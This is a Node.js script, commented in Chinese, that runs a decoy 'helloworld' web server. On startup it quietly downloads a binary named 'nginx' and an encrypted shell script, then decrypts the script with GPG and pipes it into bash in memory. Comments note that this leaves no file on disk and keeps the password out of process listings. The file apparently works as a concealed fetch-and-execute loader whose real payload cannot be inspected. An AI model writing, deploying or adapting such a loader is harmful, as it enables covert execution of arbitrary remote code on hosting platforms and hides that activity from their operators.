'use strict';

const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises'); // Node 15+ 支持

// ── 1. 安全配置读取 (优先 Docker Secret，其次 环境变量) ───────────
let gpgPassword = '';
const SECRET_FILE_PATH = '/run/secrets/gpg_pass';

if (fs.existsSync(SECRET_FILE_PATH)) {
  try {
    gpgPassword = fs.readFileSync(SECRET_FILE_PATH, 'utf8').trim();
    console.log('✅ 成功从 Secret 挂载文件读取密码 (生产安全模式)');
  } catch (err) {
    console.error('读取 Secret 文件失败:', err.message);
  }
}

if (!gpgPassword) {
  gpgPassword = process.env.GPG_PASSWORD || '';
  if (gpgPassword) console.log('ℹ️ 从环境变量读取密码 (本地开发模式)');
}

// ── 2. 全局配置 ─────────────────────────────────────────────────
const CONFIG = {
  port: process.env.PORT || 5000,
  nginxUrl: process.env.FILE_1_URL || 'https://example.com/download/nginx',
  file2Url: process.env.FILE_2_URL || 'https://example.com/download/xxx.sh.gpg',
  password: gpgPassword,
  downloadDir: process.env.DOWNLOAD_DIR || '/tmp/myapp',
  downloadTimeoutMs: 30_000,
  maxRedirects: 5,
};

// ── 3. 工具函数：健壮的下载器 (带超时、重定向、流清理) ───────────
function downloadFile(url, dest, redirectsLeft = CONFIG.maxRedirects) {
  return new Promise((resolve, reject) => {
    const timer = setTimeout(() => reject(new Error(`下载超时: ${url}`)), CONFIG.downloadTimeoutMs);
    const cleanup = (err) => { clearTimeout(timer); fs.unlink(dest, () => {}); reject(err); };

    https.get(url, { timeout: CONFIG.downloadTimeoutMs }, (res) => {
      if ([301, 302, 307, 308].includes(res.statusCode) && res.headers.location) {
        if (redirectsLeft <= 0) return cleanup(new Error('重定向次数超限'));
        clearTimeout(timer);
        return resolve(downloadFile(res.headers.location, dest, redirectsLeft - 1));
      }
      if (res.statusCode !== 200) return cleanup(new Error(`下载失败 [${res.statusCode}]: ${url}`));

      const file = fs.createWriteStream(dest);
      pipeline(res, file).then(() => { clearTimeout(timer); resolve(dest); }).catch(cleanup);
    }).on('error', cleanup);
  });
}

// ── 4. 主任务流程 ───────────────────────────────────────────────
async function mainTask() {
  if (!CONFIG.password) throw new Error('❌ 未找到 GPG 密码！请检查 Docker Secret 或环境变量。');

  await fs.promises.mkdir(CONFIG.downloadDir, { recursive: true });

  // 解析文件名
  let fileName1 = 'nginx', fileName2 = 'xxx.sh.gpg';
  try {
    fileName1 = path.basename(new URL(CONFIG.nginxUrl).pathname) || 'nginx';
    fileName2 = path.basename(new URL(CONFIG.file2Url).pathname) || 'xxx.sh.gpg';
  } catch (e) { console.warn('⚠️ URL 解析异常，使用默认文件名'); }

  const nginx = path.join(CONFIG.downloadDir, fileName1);
  const file2 = path.join(CONFIG.downloadDir, fileName2);

  console.log('⬇️  并行下载文件...');
  await Promise.all([ downloadFile(CONFIG.nginxUrl, nginx), downloadFile(CONFIG.file2Url, file2) ]);
  console.log('✅ 文件下载完成');

  // 授权 (注：.gpg 为加密数据，赋予执行权限无意义且不安全，故仅对 nginx 赋权)
  await fs.promises.chmod(nginx, 0o755);
  console.log(`✅ 已授予 ${fileName1} 可执行权限`);

  console.log('🔓 正在解密并直接通过内存管道执行 (不落地临时文件)...');
  
  // 启动 GPG 进程
  const gpg = spawn('gpg', [
    '--batch', '--yes', '--pinentry-mode', 'loopback',
    '--passphrase-fd', '0', // 从 stdin 读取密码
    '-d', file2
  ]);

  // 启动 Bash 进程
  const bash = spawn('bash');

  // 建立 Node 层面的内存管道：gpg 解密输出 -> bash 输入
  gpg.stdout.pipe(bash.stdin);

  // 实时日志输出
  gpg.stderr.pipe(process.stderr, { end: false });
  bash.stdout.pipe(process.stdout);
  bash.stderr.pipe(process.stderr, { end: false });

  // 安全传入密码 (不会出现在 ps aux 进程列表中)
  gpg.stdin.write(CONFIG.password);
  gpg.stdin.end();

  // 等待执行完成
  await new Promise((resolve, reject) => {
    bash.on('close', (code) => code === 0 ? resolve() : reject(new Error(`Bash 退出码: ${code}`)));
    gpg.on('error', (err) => reject(new Error(`GPG 进程异常: ${err.message}`)));
    bash.on('error', (err) => reject(new Error(`Bash 进程异常: ${err.message}`)));
  });

  console.log('✅ 管道执行完毕，任务结束！');
}

// ── 5. Web 服务器与生命周期 ─────────────────────────────────────
const server = http.createServer((req, res) => {
  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end('helloworld\n');
});

server.listen(CONFIG.port, '0.0.0.0', () => {
  console.log(`🚀 Web 服务已启动: http://0.0.0.0:${CONFIG.port}`);
  mainTask().catch((err) => { console.error('❌ 主任务失败:', err.message); });
});

// 优雅退出
process.on('SIGTERM', () => server.close(() => process.exit(0)));
process.on('SIGINT',  () => server.close(() => process.exit(0)));
